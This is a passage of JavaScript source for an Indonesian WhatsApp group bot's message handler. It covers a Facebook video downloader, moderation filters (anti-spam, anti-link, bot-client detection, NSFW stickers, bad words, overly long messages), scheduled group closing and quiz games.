  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replyalya('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    alya.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replyalya('Maybe private video!')
  }

}

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
alya.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
alya.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}

        
        if (!m.isGroup && !Ryuu && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return;
            }
        }
        
        if (!Ryuu && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
if (cekpesan) {
      const chatId = m.key.remoteJid;
      const senderId = m.key.participant || m.key.remoteJid;
      if (!global.db.chats[chatId]) global.db.chats[chatId] = {};
      if (!global.db.chats[chatId].totalChat) global.db.chats[chatId].totalChat = {};
      global.db.chats[chatId].totalChat[senderId] = (global.db.chats[chatId].totalChat[senderId] || 0) + 1;
      saveDB(global.db);
      const msgContent = m.message.conversation || (m.message.extendedTextMessage && m.message.extendedTextMessage.text) || '';
	}
if (reactpsn) {
        let kice = m.sender
        const emojis = ['😎', '😂', '🔥', '❤️', '👍', '🥲', '😱', '🤖', '🎉', '👀']
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
        await alya.sendMessage(m.chat, {
            react: {
                text: randomEmoji,
                key: m.key
            }
        })
}







if (db.settings[botNumber].whitelistMode) {
    if (m.isGroup && !whitelist.includes(m.chat) && !Ryuu) {
        return
    }
    if (!m.isGroup && !Ryuu && alya.public === false) {
        return
    }
}

if (
  antitagsw.includes(m.chat) &&
  (m.mtype === 'groupStatusMentionMessage' || m.mtype === 'groupStatusMessageV2') &&
  !isAdmins &&
  !Ryuu
) {
  if (!warnTagSw[m.chat]) warnTagSw[m.chat] = {};
  if (!warnTagSw[m.chat][m.sender]) warnTagSw[m.chat][m.sender] = 1;
  else warnTagSw[m.chat][m.sender] += 1;

  let warning = warnTagSw[m.chat][m.sender];
  saveAntitagWarning();

  await alya.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.key.participant
    }
  });

  if (warning >= 3) {
    delete warnTagSw[m.chat][m.sender];
    saveAntitagWarning();
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    return alya.sendMessage(m.chat, {
      text: `🚨 *「 Tag Status Terdeteksi 」*\n\n@${m.sender.split("@")[0]} telah mention grup lewat status sebanyak 3x.\n💥 Dikeluarkan dari grup.`,
      contextInfo: { mentionedJid: [m.sender] }
    });
  } else {
    return alya.sendMessage(m.chat, {
      text: `⚠️ *「 Tag Status Terdeteksi 」*\n\n@${m.sender.split("@")[0]}, dilarang mention grup lewat status!\n📛 Peringatan ke: *${warning}/3*`,
      contextInfo: { mentionedJid: [m.sender] }
    });
  }
}

if (
    db?.data?.chats[m.chat]?.antipromosi?.status &&
    m.isGroup &&
    !isAdmins &&
    !Ryuu
) {
    const text = m.text || m.caption || ''
    if (!text) return

    const promoRegex = /\b(book|fee|minat|list|jasjok|jasgen|ft|rental|butuh|saldo|file|logo|paket|pakmal|pakpag|jual|paket|gendong|pp)\b/i

    const match = text.match(promoRegex)

    if (match) {
        let user = m.sender
        let detected = match[0]

        await alya.sendMessage(m.chat, {
            delete: m.key
        })
        await alya.sendMessage(m.chat, {
            text: `⚠️ @${user.split('@')[0]} gaboleh ngirim gitu disini!

🧩 Terdeteksi ngirim ini: *"${detected}"*
📌 Pesan kamu telah dihapus.`,
            mentions: [user]
        })
    }
}



const saveSpamData = () => debouncedWrite(dbSpamCounter, () => spamData, 5000)
const isAntiSpam = antiSpamGroups.includes(m.chat)
const isUserProtected = isAdmins || m.sender === Ryuu

if (isAntiSpam && !isUserProtected && m.body) {
    const now = Date.now()
    if (!spamData[m.sender]) {
        spamData[m.sender] = { count: 0, lastMsgTime: now, lastText: '' }
    }

    let user = spamData[m.sender]
    const isSameText = user.lastText === m.body

    if (now - user.lastMsgTime < 2000) {
        user.count += 1
    } else {
        user.count = 1
    }

    user.lastMsgTime = now
    user.lastText = m.body
    saveSpamData()

    if (user.count >= 5 || (user.count >= 3 && isSameText)) {
        
        spamWarnings[m.sender] = (spamWarnings[m.sender] || 0) + 1
        debouncedWrite(dbSpamWarn, () => spamWarnings, 5000) 

        user.count = 0 
        saveSpamData()

        if (spamWarnings[m.sender] >= 5) {
            await replyalya(`🚫 @${m.sender.split('@')[0]} Telah mencapai batas maksimal spam (5/5). Mengeluarkan dari grup...`)
            
            delete spamWarnings[m.sender]
            delete spamData[m.sender]
            debouncedWrite(dbSpamWarn, () => spamWarnings, 5000) 
            saveSpamData()
            return await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        } else {
            return replyalya(
                `⚠️ *ANTISPAM DETECTED* ⚠️\n\n` +
                `Halo @${m.sender.split('@')[0]},\n` +
                `Jangan spam atau kamu akan dikick otomatis.\n\n` +
                `📌 *Peringatan:* ${spamWarnings[m.sender]} / 5`
            )
        }
    }
}

if (m.isGroup && antibot[m.chat] === true) {
  if (!isAdmins && !Ryuu && !m.key.fromMe) {

    const targetId = m.key.id || ''
    let reasons = []
    let score = 0

    const nonHex = targetId.match(/[^0-9A-F]/gi)
    if (nonHex) {
      const unique = [...new Set(nonHex)].join('').toUpperCase()
      reasons.push(`Karakter tidak valid: [ ${unique} ]`)
      score++
    }

    if (targetId.startsWith('3EB0')) {
      reasons.push('WhatsApp Web (3EB0)')
      score++
    }

    if (targetId.startsWith('BAE5')) {
      reasons.push('Baileys Lama (BAE5)')
      score++
    }

    if (targetId.length < 16 || targetId.length > 32) {
      reasons.push(`Panjang ID Tidak Normal (${targetId.length})`)
      score++
    }

    if (score >= 1) {

      const actionType = antibotSettings[m.chat] || 'delete'
      const timeNow = new Date().toLocaleTimeString('id-ID', {
        timeZone: 'Asia/Jakarta'
      })

      const report = `⚡ *SISTEM KEAMANAN GRUP* ⚡
⏰ *Waktu:* ${timeNow}
👤 *User:* @${m.sender.split('@')[0]}
🔑 *ID:* ${targetId}

🚫 *Terdeteksi Bot / Client Tidak Resmi*
${reasons.map(r => `> • ${r}`).join('\n')}

🔨 *Sanksi:* ${
        actionType === 'kick'
          ? 'HAPUS & TENDANG'
          : 'HAPUS PESAN'
      }`

      await alya.sendMessage(
        m.chat,
        {
          text: report,
          contextInfo: { mentionedJid: [m.sender] }
        },
        { quoted: m }
      )

      await alya.sendMessage(m.chat, { delete: m.key })

      if (actionType === 'kick' && isBotAdmins) {
        await sleep(2000)
        await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
      }
    }
  }
}

if (isAntilinkgc2) {
  const regex = /https:\/\/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
  const match = budy.match(regex);

  if (match) {
    const groupCodeFromLink = match[1];

    try {
      const thisGroupCode = await alya.groupInviteCode(m.chat);
      const isLinkThisGroup = groupCodeFromLink === thisGroupCode;

      if (isLinkThisGroup) return
      if (!isBotAdmins) return
      if (isAdmins || Ryuu || fromMe) return

      if (!antilinkgc2_db[m.chat]) antilinkgc2_db[m.chat] = {}
      if (!antilinkgc2_db[m.chat][m.sender]) {
        antilinkgc2_db[m.chat][m.sender] = {
          lastSend: 0,
          count: 0
        }
      }

      let user = antilinkgc2_db[m.chat][m.sender]
      let now = Date.now()

      if (now - user.lastSend > 86400000) {
        user.count = 0
      }

      user.lastSend = now
      user.count += 1

      let mode = antilinkgc2[m.chat].mode || 'kick'

      if (user.count === 1) {
        return alya.sendMessage(m.chat, {
          text: `✅ @${m.sender.split("@")[0]} mengirim link (1x hari ini).\nMasih diperbolehkan.`,
          contextInfo: { mentionedJid: [m.sender] }
        });
      }
      await alya.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant
        }
      });

      if (mode === 'delete') {
        await alya.sendMessage(m.chat, {
          text: `⚠️ @${m.sender.split("@")[0]} kirim link lagi!\nPeringatan ke ${user.count}/5\nMode: DELETE ONLY`,
          contextInfo: { mentionedJid: [m.sender] }
        });

      } else if (mode === 'kick') {

        if (user.count >= 5) {
          await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')

          await alya.sendMessage(m.chat, {
            text: `🚫 @${m.sender.split("@")[0]} spam link lebih dari 5x!\n\nDikeluarkan dari grup.`,
            contextInfo: { mentionedJid: [m.sender] }
          });

          user.count = 0

        } else {
          await alya.sendMessage(m.chat, {
            text: `⚠️ @${m.sender.split("@")[0]} melanggar!\nPeringatan ke ${user.count}/5`,
            contextInfo: { mentionedJid: [m.sender] }
          });
        }
      }
      debouncedWrite('./database/antilinkgc2-db.json', () => antilinkgc2_db, 5000) 

    } catch (err) {
      console.error(err)
    }
  }
}


const _antilinkNow = Date.now();
if (!global._antilinkDbCache || (_antilinkNow - global._antilinkDbCache.ts) > 5000) {
    try {
        global._antilinkDbCache = {
            data: JSON.parse(fs.readFileSync('./database/antilinkgc.json')),
            ts: _antilinkNow
        };
    } catch {
        global._antilinkDbCache = { data: {}, ts: _antilinkNow };
    }
}
let antilinkDb = global._antilinkDbCache.data;
const antilinkData = m.isGroup ? antilinkDb[m.chat] : false;

if (antilinkData) {
    
    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
    const isGroupLink = regex.test(budy);

    if (isGroupLink) {
        const groupCodeFromLink = budy.match(regex)[1];

        try {
            
            if (!isBotAdmins) return; 
            if (isAdmins || Ryuu || m.fromMe) return;

            const thisGroupCode = await alya.groupInviteCode(m.chat);
            const isInternalLink = groupCodeFromLink === thisGroupCode;

            
            if (isInternalLink) return;

            
            await alya.sendMessage(m.chat, { delete: m.key });

            const currentMode = antilinkData.mode;

            if (currentMode === 'warning') {
                const warningsFile = './database/antilinkgc-warning.json';
                
                if (!global._antilinkWarnCache || (Date.now() - global._antilinkWarnCache.ts) > 5000) {
                    global._antilinkWarnCache = {
                        data: fs.existsSync(warningsFile) ? JSON.parse(fs.readFileSync(warningsFile)) : {},
                        ts: Date.now()
                    };
                }
                let warningDb = global._antilinkWarnCache.data;

                if (!warningDb[m.chat]) warningDb[m.chat] = {};
                if (!warningDb[m.chat][m.sender]) warningDb[m.chat][m.sender] = 0;

                warningDb[m.chat][m.sender] += 1;
                const warnCount = warningDb[m.chat][m.sender];

                if (warnCount >= 3) {
                    global._antilinkWarnCache = null; 
                    
                    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                    await alya.sendMessage(m.chat, {
                        text: `🚫 *KICK MODE*\n\n@${m.sender.split("@")[0]} telah mencapai batas 3x peringatan karena mengirim link grup lain.`,
                        mentions: [m.sender]
                    });
                    
                    
                    warningDb[m.chat][m.sender] = 0; 
                } else {
                    
                    await alya.sendMessage(m.chat, {
                        text: `⚠️ *LINK TERDETEKSI*\n\n@${m.sender.split("@")[0]}, dilarang mengirim link grup lain!\nPeringatan: *${warnCount}/3*.\n\n_Pesan telah dihapus otomatis._`,
                        mentions: [m.sender]
                    });
                }
                
                
                debouncedWrite(warningsFile, () => warningDb, 5000); 

            } else if (currentMode === 'delete') {
                await alya.sendMessage(m.chat, { 
                    text: `🚫 *ANTI LINK*\n\nMaaf @${m.sender.split("@")[0]}, link grup lain tidak diperbolehkan di sini.\n\n_Pesan telah dihapus otomatis._`,
                    mentions: [m.sender]
                });
            }

        } catch (err) {
            console.error('AntilinkGC Error:', err);
        }
    }
}
if (!global._autoCloseIntervalRegistered) {
  global._autoCloseIntervalRegistered = true
  setInterval(async () => {
    let now = moment.tz('Asia/Jakarta').format('HH:mm');

    for (let groupId in autoCloseDB) {
        let config = autoCloseDB[groupId];
        if (!config.status) continue;

        try {
            if (!autoCloseLastAction[groupId]) {
                autoCloseLastAction[groupId] = { tutup: '', buka: '' };
            }

            if (now === config.tutup && autoCloseLastAction[groupId].tutup !== now) {
                await alya.groupSettingUpdate(groupId, 'announcement');
                await alya.sendMessage(groupId, {
                    text: `🌙 *Selamat Malam Semua!*\nGrup ini telah *ditutup otomatis* pada *${config.tutup} WIB*.\n\n🛌 Waktunya istirahat~`
                });
                autoCloseLastAction[groupId].tutup = now;
                if (process.env.NODE_ENV !== 'production') console.log(`🔒 Grup ${groupId} ditutup [${now}]`);
            }

            if (now === config.buka && autoCloseLastAction[groupId].buka !== now) {
                await alya.groupSettingUpdate(groupId, 'not_announcement');
                await alya.sendMessage(groupId, {
                    text: `☀️ *Selamat Pagi!*\nGrup ini telah *dibuka otomatis* pada *${config.buka} WIB*.\n\n💬 Selamat ngobrol dan semangat harinya! 🌻`
                });
                autoCloseLastAction[groupId].buka = now;
                if (process.env.NODE_ENV !== 'production') console.log(`🔓 Grup ${groupId} dibuka [${now}]`);
            }

        } catch (e) {
            console.error(`❗ Gagal update grup ${groupId}: ${e.message}`);
        }
    }
  }, 60 * 1000); 
}

if (Antilinkch && budy.match(/whatsapp\.com\/channel/gi)) {
    if (!isBotAdmins) return replytolak('🚫 *Bot harus menjadi admin untuk menindak pelanggaran link!*');

    let senderId = m.sender;

    if (isAdmins) {
        return alya.sendMessage(m.chat, {
            text: `🛡️ *「 Channel Link Terdeteksi 」*\n\n👮 Admin mengirim link, admin diperbolehkan.`,
        }, { quoted: m });
    }
    if (Ryuu) {
        return alya.sendMessage(m.chat, {
            text: `🛡️ *「 Channel Link Terdeteksi 」*\n\n👑 Owner mengirim link, owner diperbolehkan.`,
        }, { quoted: m });
    }
    await alya.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
    if (!warnlinkch[m.chat]) warnlinkch[m.chat] = {};
    if (!warnlinkch[m.chat][senderId]) warnlinkch[m.chat][senderId] = 1;
    else warnlinkch[m.chat][senderId] += 1;

    let warning = warnlinkch[m.chat][senderId];
    saveWarnLinkCh();

    if (warning >= 3) {
        delete warnlinkch[m.chat][senderId];
        saveWarnLinkCh();

        await alya.groupParticipantsUpdate(m.chat, [senderId], 'remove');

        return alya.sendMessage(m.chat, {
            text: `🚨 *「 Channel Link Terdeteksi 」*\n\n@${senderId.split("@")[0]} telah mengirim link channel *sebanyak 3 kali*.\n\n💣 *Aksi: Dikeluarkan dari grup!*`,
            contextInfo: { mentionedJid: [senderId] }
        }, { quoted: m });
    } else {
        return alya.sendMessage(m.chat, {
            text: `⚠️ *「 Peringatan Link Channel 」*\n\n@${senderId.split("@")[0]}, dilarang mengirim link channel WhatsApp!\n📛 Peringatan ke: *${warning}/3*\n🧹 Pesanmu telah dihapus.`,
            contextInfo: { mentionedJid: [senderId] }
        }, { quoted: m });
    }
}
if (antiWame && budy.match(/wa\.me/gi)) {
    if (!isBotAdmins) return replytolak('🚫 *Bot harus menjadi admin untuk menindak pelanggaran link wa(dot)me!*');

    let senderId = m.sender;

    if (isAdmins) {
        return alya.sendMessage(m.chat, {
            text: `🛡️ *「 Link WhatsApp Terdeteksi 」*\n\n👮 Admin mengirim link Wangsap :v, admin mah bebas 😇`,
        }, { quoted: m });
    }
    
    if (Ryuu) {
        return alya.sendMessage(m.chat, {
            text: `🛡️ *「 Link WhatsApp Terdeteksi 」*\n\n👑 Owner mengirim link Wangsap :v, owner mah Bebas 😇 .`,
        }, { quoted: m });
    }
    await alya.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    });
    if (!warnwame[m.chat]) warnwame[m.chat] = {};
    if (!warnwame[m.chat][senderId]) warnwame[m.chat][senderId] = 1;
    else warnwame[m.chat][senderId] += 1;

    let warning = warnwame[m.chat][senderId];

    if (warning >= 3) {
        delete warnwame[m.chat][senderId];
        await alya.groupParticipantsUpdate(m.chat, [senderId], 'remove');

        return alya.sendMessage(m.chat, {
            text: `🚨 *「 Link WhatsApp Terdeteksi 」*\n\n@${senderId.split("@")[0]} telah mengirim link wa(dot)me *sebanyak 3 kali*.\n\n💣 *Aksi: Dikeluarkan dari grup!*`,
            contextInfo: { mentionedJid: [senderId] }
        }, { quoted: m });
    } else {
        return alya.sendMessage(m.chat, {
            text: `⚠️ *「 Peringatan Link WhatsApp 」*\n\n@${senderId.split("@")[0]}, dilarang mengirim link wa(dot)me di grup ini!\n📛 Peringatan ke: *${warning}/3*\n🧹 Pesanmu telah dihapus.`,
            contextInfo: { mentionedJid: [senderId] }
        }, { quoted: m });
    }
}

if (m.isGroup && antiNSFWGroups.includes(m.chat)) {
  if (m.mtype === 'stickerMessage') {
    try {
      const groupAdmins = groupMetadata.participants
        .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
        .map(p => p.id);

      const owner = Ryuu;
      const tagUser = `@${m.sender.split('@')[0]}`;

      const isAdmin = groupAdmins.includes(m.sender);
      const isOwner = m.sender === owner;

      if (isAdmin || isOwner) {
        await alya.sendMessage(m.chat, {
          text: `⚠️ ${tagUser}, kamu admin/owner. Stiker tidak dihapus.`,
          mentions: [m.sender]
        });
        return;
      }
      const stickerBuffer = await m.download();

      const { labelName, confidence } = await nsfwchecker(stickerBuffer);

      if (labelName !== 'Not Porn' && confidence >= 0.8) {
        await alya.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
          }
        });

        if (!nsfwWarnings[m.sender]) nsfwWarnings[m.sender] = 0;
        nsfwWarnings[m.sender]++;
        debouncedWrite(dbWarnFile, () => nsfwWarnings, 5000); 

        const maxWarnings = 5;
        const warningCount = nsfwWarnings[m.sender];

        if (warningCount >= maxWarnings) {
          await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
          await alya.sendMessage(m.chat, {
            text: `🚫 ${tagUser} sudah ${maxWarnings}x mengirim stiker Haram dan di-kick!`,
            mentions: [m.sender]
          });
          nsfwWarnings[m.sender] = 0;
          debouncedWrite(dbWarnFile, () => nsfwWarnings, 5000); 
        } else {
          await alya.sendMessage(m.chat, {
            text: `⚠️ ${tagUser}, stiker Haram terdeteksi!\nWarning: ${warningCount}/${maxWarnings}`,
            mentions: [m.sender]
          });
        }
      }

    } catch (err) {
      console.error('Error AntiNSFW:', err);
    }
  }
}


if (m.isGroup && nttoxic.includes(m.chat)) {
    let body = (m.text || "").toLowerCase().trim();

    if (!Array.isArray(badwords)) badwords = [];

    let cleanBody = body.replace(/[^\p{L}\p{N}\s]/gu, "");

    function normalizeText(text) {
        return text
            .replace(/4/g, "a")
            .replace(/3/g, "e")
            .replace(/1/g, "i")
            .replace(/0/g, "o")
            .replace(/5/g, "s")
            .replace(/7/g, "t");
    }

    let normalizedBody = normalizeText(cleanBody);

    let isToxic = badwords.some(bw => {
        let pattern = new RegExp(`\\b${normalizeText(bw)}\\b`, "i");
        return pattern.test(normalizedBody);
    });

    if (isToxic) {
        let tagUser = `@${m.sender.split('@')[0]}`;

        let isAdmin = Array.isArray(groupAdmins) && groupAdmins.includes(m.sender);
        let isOwner = m.sender === '6283166570663@s.whatsapp.net'; 

        if (isAdmin || Ryuu) {
            await alya.sendMessage(m.chat, {
                text: `⚠️ ${tagUser}, kamu admin/owner, jadi tidak diwarn atau di-kick, tapi tolong jangan toxic ya!`,
                mentions: [m.sender]
            });
            return; 
        }

        try {
            await alya.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });

            if (!userWarnings[m.sender]) userWarnings[m.sender] = 0;
            userWarnings[m.sender] += 1;
            let warningCount = userWarnings[m.sender];

            const maxWarnings = 5; 

            if (warningCount >= maxWarnings) {
                await alya.groupParticipantsUpdate(m.chat, [m.sender], "remove");
                await alya.sendMessage(m.chat, {
                    text: `🚫 ${tagUser} sudah ${maxWarnings}x toxic dan di-kick!`,
                    mentions: [m.sender]
                });
                userWarnings[m.sender] = 0;
            } else {
                await alya.sendMessage(m.chat, {
                    text: `⚠️ ${tagUser}, jangan toxic!\nWarning: ${warningCount}/${maxWarnings}`,
                    mentions: [m.sender]
                });
            }

        } catch (e) {
            console.log('Error AntiToxic:', e);
        }
    }
}
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return replytolak('_Bot Harus Menjadi Admin Terlebih Dahulu_')
          await alya.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			alya.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
			
  }
  }
if (AntiLinkYoutubeVid && (budy.includes("https://youtu.be/") || budy.includes("https://www.youtube.com/watch") || budy.includes("https://youtube.com/watch"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 YouTube Video Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 YouTube Video Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

if (AntiLinkYoutubeChannel && (budy.includes("https://youtube.com/@") || budy.includes("https://www.youtube.com/@") || budy.includes("https://youtube.com/channel/") || budy.includes("https://www.youtube.com/channel/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 YouTube Channel Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 YouTube Channel Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

if (AntiLinkInstagram && (budy.includes("https://www.instagram.com/") || budy.includes("https://instagram.com/") || budy.includes("https://instagr.am/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 Instagram Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 Instagram Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

if (AntiLinkFacebook && (budy.includes("https://facebook.com/") || budy.includes("https://www.facebook.com/") || budy.includes("https://fb.me/") || budy.includes("https://fb.com/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 Facebook Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 Facebook Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

if (AntiLinkTelegram && (budy.includes("https://t.me/") || budy.includes("t.me/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 Telegram Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 Telegram Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}
if (AntiLinkTiktok && (budy.includes("https://www.tiktok.com/") || budy.includes("https://vt.tiktok.com/") || budy.includes("https://vm.tiktok.com/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 TikTok Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 TikTok Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

if (AntiLinkTwitter && (budy.includes("https://twitter.com/") || budy.includes("https://x.com/") || budy.includes("https://t.co/"))) {
  if (!isBotAdmins) {
    
  } else if (isAdmins || Ryuu || m.key.fromMe) {
    alya.sendMessage(from, { text: `🛡️ *「 Twitter/X Link Terdeteksi 」*\n\n👮 Admin/Owner diperbolehkan kirim link ini.` }, { quoted: m });
  } else {
    await alya.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
    await alya.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch(() => {});
    alya.sendMessage(from, { text: `⚠️ *「 Twitter/X Link Terdeteksi 」*\n\n@${m.sender.split('@')[0]} telah dikeluarkan karena mengirim link terlarang.`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m });
  }
}

alya.family100 = alya.family100 ? alya.family100 : {};
if (from in alya.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; 
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = alya.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replyalya('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();

    alya.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        alya.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete alya.family100[id];
    }
}

alya.tebaklagu = alya.tebaklagu || {}
if (alya.tebaklagu && alya.tebaklagu[m.chat] && !m.key.fromMe) {
  
  let sentMsg = alya.tebaklagu[m.chat][0]
  let json    = alya.tebaklagu[m.chat][1]
  let timer   = alya.tebaklagu[m.chat][2]

  if (m.text) {
    const teks = m.text.toLowerCase().trim()
    if (teks === json.jawaban.toLowerCase().trim()) {
      clearTimeout(timer)
      delete alya.tebaklagu[m.chat]
      if (global.db?.users?.[m.sender]) {
        global.db.users[m.sender].money = (global.db.users[m.sender].money || 0) + 15000
        global.db.users[m.sender].limit = (global.db.users[m.sender].limit || 0) + 2
      }
      replyalya(
        `🎉 *BENAR!*\n\n🎵 Judul: *${json.jawaban}*\n🎤 Artist: *${json.artist || '?'}*\n💰 +15,000 Money\n🎫 +2 Limit`
      )
    } else if (/^(nyerah|surrender)$/i.test(teks)) {
      clearTimeout(timer)
      delete alya.tebaklagu[m.chat]
